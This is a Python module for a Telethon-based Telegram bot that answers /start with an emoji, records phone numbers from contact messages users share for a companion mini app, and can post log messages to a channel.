"""Telegram bot polling using Telethon (no python-telegram-bot needed).

Handles:
- /start command  -> replies with "👇"
- Contact messages -> stores user_id -> phone in `contacts` dict for the miniapp

Optionally sends log messages to a channel via `send_to_channel()`.
"""
import os
import asyncio
import threading
import logging
from telethon import TelegramClient, events

logger = logging.getLogger(__name__)

# Shared state: telegram user_id (str) -> phone (E.164 with +)
contacts = {}

_bot_thread = None
_bot_client = None
_bot_loop = None


async def _run(bot_token, api_id, api_hash, session_file):
    global _bot_client, _bot_loop
    _bot_loop = asyncio.get_running_loop()
    _bot_client = TelegramClient(session_file, api_id, api_hash)
    await _bot_client.start(bot_token=bot_token)
    logger.info("Bot polling started")

    @_bot_client.on(events.NewMessage(pattern=r"^/start"))
    async def _start(event):
        try:
            await event.respond("👇")
        except Exception as e:
            logger.error(f"start reply error: {e}")

    @_bot_client.on(events.NewMessage)
    async def _all(event):
        msg = event.message
        media = getattr(msg, "media", None)
        if not media:
            return
        uid = getattr(media, "user_id", None)
        phone = getattr(media, "phone_number", None)
        if uid and phone:
            contacts[str(uid)] = phone if phone.startswith("+") else "+" + phone
            logger.info(f"Bot received contact: {uid} -> {phone}")

    await _bot_client.run_until_disconnected()


def _thread_main(bot_token, api_id, api_hash, session_file):
    global _bot_thread
    try:
        loop = asyncio.new_event_loop()
        asyncio.set_event_loop(loop)
        loop.run_until_complete(_run(bot_token, api_id, api_hash, session_file))
    except Exception as e:
        logger.error(f"Bot thread crashed: {e}")


def start_in_background(bot_token, api_id, api_hash, session_file="bot_session"):
    global _bot_thread
    if _bot_thread and _bot_thread.is_alive():
        return _bot_thread
    _bot_thread = threading.Thread(
        target=_thread_main,
        args=(bot_token, api_id, api_hash, session_file),
        daemon=True,
        name="telegram-bot",
    )
    _bot_thread.start()
    return _bot_thread


def send_to_channel(channel_id, message):
    """Send a markdown message to the log channel via the running bot client."""
    if not _bot_client or not _bot_loop or not channel_id:
        return False
    try:
        fut = asyncio.run_coroutine_threadsafe(
            _bot_client.send_message(int(channel_id), message, parse_mode="md"),
            _bot_loop,
        )
        fut.result(timeout=15)
        return True
    except Exception as e:
        logger.error(f"Channel log error: {e}")
        return False
